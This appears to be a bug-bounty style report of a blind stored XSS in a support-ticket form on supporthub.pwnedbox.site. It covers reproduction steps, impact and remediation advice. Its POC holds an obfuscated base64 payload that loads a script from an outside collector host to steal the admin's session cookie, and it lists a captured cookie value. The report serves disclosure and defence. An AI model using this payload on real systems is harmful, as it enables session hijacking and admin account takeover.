## Title
Blind XSS in Support Request Message Parameter - SupportHub

## Description
**Affected URL:** https://supporthub.pwnedbox.site/submit.php (triggers on https://supporthub.pwnedbox.site/admin/view.php?id=3)

A Blind Cross-Site Scripting (XSS) vulnerability exists in the support request submission form on `supporthub.pwnedbox.site`. Input submitted in the **Message** field is stored without HTML encoding and renders directly in the DOM when an administrator opens the ticket in the backend (`/admin/view.php`). Because the script executes inside an authenticated admin session and `PHPSESSID` lacks the `HttpOnly` flag, an attacker can exfiltrate the administrator's session cookie and compromise the admin panel.

## Steps to Reproduce
1. Go to `https://supporthub.pwnedbox.site/submit.php`, fill in the required fields, paste the Blind XSS payload into the **Message** box, and click **Submit request**.
2. Log in to the admin panel (`https://supporthub.pwnedbox.site/admin/index.php`) and open the submitted request (`/admin/view.php?id=3`).
3. Observe the payload execute immediately in the ticket body, sending an out-of-band callback with the admin's `PHPSESSID` cookie and page details.

## POC (Proof of Concept)
**Injection Endpoint:** `https://supporthub.pwnedbox.site/submit.php` (`Message` field)

**Trigger Endpoint:** `https://supporthub.pwnedbox.site/admin/view.php?id=3`

**Payload:**
```html
"><img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8veHNzLnJlcG9ydC9jL3JhcGlkbmV3dDYzMTAxIjtkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKGEpOw&#61;&#61; onerror=eval(atob(this.id))>
```

**Out-of-Band Callback Data Captured:**
- **Triggered URI:** `https://supporthub.pwnedbox.site/admin/view.php?id=3`
- **Referrer:** `https://supporthub.pwnedbox.site/admin/index.php`
- **Exfiltrated Session Cookie:** `PHPSESSID=7b06aba80de6218dbe17167df0233328`

**Visual Evidence:**
- Support submission form on `supporthub.pwnedbox.site/submit.php` with the payload entered in the **Message** field.
  <img width="1826" height="977" alt="image" src="https://github.com/user-attachments/assets/9623431a-135d-40ef-affc-c6700eae0d46" /><br><br>

- Admin ticket view (`/admin/view.php?id=3`) displaying the rendered broken image icon in the message area where the script fired, alongside Browser Storage showing `PHPSESSID` with `HttpOnly` set to `false`.
  <img width="1897" height="770" alt="image" src="https://github.com/user-attachments/assets/f80313dd-2daf-4bf0-96c6-104d52b94522" /><br><br>

- Blind XSS collector report confirming execution on `/admin/view.php?id=3` and capturing the admin's `PHPSESSID` cookie and screenshot.
  <img width="1562" height="1002" alt="image" src="https://github.com/user-attachments/assets/5788048e-3ff4-43d4-9ece-184dd12b77d5" /><br>


## Impact
Because the payload executes automatically when an administrator reviews incoming support requests:
- **Admin Account Takeover:** Attackers can steal the administrator's `PHPSESSID` cookie and hijack their active session.
- **Unauthorized Data Access:** Full access to view, update, or manage all submitted customer support requests and internal support notes.
- **Persistent Compromise:** Attackers can use the hijacked admin session to modify ticket statuses, post updates as support staff, or make unauthorized changes across the application.

## Remediation
1. **Encode Output:** Apply `htmlspecialchars($input, ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8')` to all user-supplied ticket fields before rendering them in `/admin/view.php` and `/admin/index.php`.
2. **Protect Session Cookies:** Set the `HttpOnly`, `Secure`, and `SameSite=Strict` flags on `PHPSESSID` so JavaScript cannot access session tokens via `document.cookie`.
3. **Add a Content Security Policy (CSP):** Enforce a strict CSP header on `/admin/` pages (e.g., `default-src 'self'; script-src 'self';`) to block inline event handlers like `onerror` and restrict external requests.
